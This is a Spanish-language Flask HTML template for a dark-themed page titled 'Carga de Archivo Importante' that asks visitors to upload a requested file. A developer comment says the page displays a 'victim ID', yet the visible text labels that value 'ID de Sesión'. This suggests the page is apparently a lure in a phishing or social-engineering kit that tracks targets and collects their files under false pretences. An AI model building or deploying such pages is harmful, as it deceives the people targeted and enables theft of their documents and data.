<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carga tu Archivo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Estilos personalizados para un mejor aspecto */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a1a2e; /* Fondo oscuro */
            color: #e4e4e7; /* Texto claro */
        }
        .container {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .card {
            background-color: #2a2a44; /* Tarjeta más oscura */
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 90%;
            border-radius: 12px;
            padding: 2.5rem;
            border: 1px solid #4a4a6e;
        }
        .file-input {
            border: 2px dashed #4a4a6e;
            padding: 1.5rem;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }
        .file-input:hover {
            border-color: #6a6a8e;
            background-color: #3a3a54;
        }
        .submit-button {
            background-color: #007bff; /* Color primario azul */
            transition: background-color 0.2s, transform 0.1s;
        }
        .submit-button:hover {
            background-color: #0056b3;
            transform: translateY(-1px);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1 class="text-3xl font-bold mb-6 text-center text-white">Carga de Archivo Importante</h1>
            <p class="text-sm text-center mb-6 text-gray-400">
                Por favor, sube el archivo que te solicitamos.
                <!-- Muestra el ID de víctima para referencia interna/debugging -->
                <span class="block mt-2 text-xs opacity-50">ID de Sesión: {{ victim_id }}</span>
            </p>

            <!-- 
            *** CORRECCIÓN CLAVE AQUÍ: action="{{ url_for('upload_file') }}" ***
            Aseguramos que el formulario POST envíe los datos a la función 
            `upload_file` de Flask, que es la que maneja la carga del archivo.
            -->
            <form method="POST" action="{{ url_for('upload_file') }}" enctype="multipart/form-data" class="space-y-6">
                
                <div class="file-input">
                    <label for="file" class="block cursor-pointer">
                        <svg xmlns="http://www.w3.org/2000/svg" class="mx-auto h-8 w-8 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
                        </svg>
                        <p class="mt-2 text-sm font-medium">Arrastra y suelta o haz clic para subir</p>
                        <p class="text-xs text-gray-500">Máximo 10MB</p>
                    </label>
                    <!-- 
                    El campo 'file' debe coincidir con request.files['file'] en main.py 
                    IMPORTANTE: El input 'file' debe ser invisible y la etiqueta se encarga de la interacción.
                    -->
                    <input id="file" name="file" type="file" required class="sr-only">
                </div>

                <button type="submit" class="submit-button w-full text-white font-semibold py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-500 focus:ring-opacity-50">
                    Subir Archivo
                </button>
            </form>
        </div>
    </div>
</body>
</html>
